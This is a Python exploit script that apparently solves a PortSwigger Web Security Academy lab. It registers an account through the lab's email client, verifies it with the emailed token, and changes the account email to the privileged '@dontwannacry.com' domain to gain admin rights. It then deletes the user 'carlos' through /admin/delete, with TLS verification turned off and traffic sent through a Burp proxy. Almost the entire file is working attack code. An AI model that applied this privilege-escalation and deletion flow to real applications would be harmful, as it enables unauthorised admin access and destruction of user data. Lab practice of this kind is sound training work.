import requests
import re




# Disable certificate warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()

# Use Burp proxy if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Take URL input

app_url = input("Enter your url :  ").strip()

# first i need to find email client address always need to change this  email client url 
email_client_url = "https://exploit-0aa1000e03a28352813a66a8019300e4.exploit-server.net"

email = session.get(email_client_url+"/email",verify=False,proxies=proxies)
email_find = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b',email.text)  # 90% this will work
#print(email_find)
first_email = email_find[0] # to get the first email
print(first_email)

# now we will find the csrf token 

csrf_token = session.get(app_url+"/register",verify=False,proxies=proxies)
token = re.search(r'name="csrf" value="(.*?)"',csrf_token.text).group(1)
print(f"csrf token of register user is",token)

data = {"username":"test","password":"test","csrf":token,"email":first_email}
register = session.post(app_url+"/register",verify=False,proxies=proxies,data=data)

# now we need to verfiy the email first from the email client 
email_verify = session.get(email_client_url+"/email",verify=False,proxies=proxies)
# <a href='https://0ab300cf040bbada85f7fd0b00e50067.web-security-academy.net/register?temp-registration-token=oKY1TGmwROLjF2U5mBrt60wdGMzO1Kp1' target=_blank>https://0ab300cf040bbada85f7fd0b00e50067.web-security-academy.net/register?temp-registration-token=oKY1TGmwROLjF2U5mBrt60wdGMzO1Kp1</a>
email_find_verify = re.findall(r'temp-registration-token=(.+)\' target=_blank>',email_verify.text)  # 90% this will work
print(email_find_verify)
if email_find_verify:
    first_token = email_find_verify[0]
    print(first_token)
else:
    print("No token found.")


# So we are going to verify the token 
    
account_verfication = session.get(f"{app_url}/register?temp-registration-token={first_token}", verify=False,proxies=proxies)
if "Account registration successful" in account_verfication.text:
    print("account register successful")


data = {"username":"test","password":"test","csrf":token}
test_user = session.post(app_url+"/login",data=data,verify=False,proxies=proxies)
cookies = session.cookies.get_dict()
print(cookies)




csrf_token1 = session.get(app_url+"/my-account?id=test",verify=False,proxies=proxies)
token1 = re.search(r'name="csrf" value="(.*?)"',csrf_token1.text).group(1)
print(f"csrf token of login  user is",token1)


data2 = {"email":"test@dontwannacry.com","csrf":token1}
change_email = session.post(app_url+"/my-account/change-email",data=data2,verify=False,proxies=proxies)


delete_carlos = session.get(app_url+"/admin/delete?username=carlos",verify=False,proxies=proxies)

